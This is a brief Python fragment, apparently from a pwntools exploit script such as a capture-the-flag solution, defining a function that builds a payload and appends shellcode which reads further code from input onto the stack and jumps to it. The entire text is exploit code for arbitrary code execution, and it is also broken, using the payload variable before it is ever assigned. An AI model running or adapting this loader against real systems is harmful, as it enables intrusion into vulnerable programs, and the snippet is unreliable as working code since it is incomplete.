def runshellcode(p, s):

    payload += '1:'
    payload += '%%%%1;'
    payload += str(0x2030A4 + 0x100 - 0x7b6) + '+'

    payload += ','

    payload += asm(shellcraft.amd64.linux.read(0, 'rsp', 0x1000))
    payload += asm('jmp rsp')
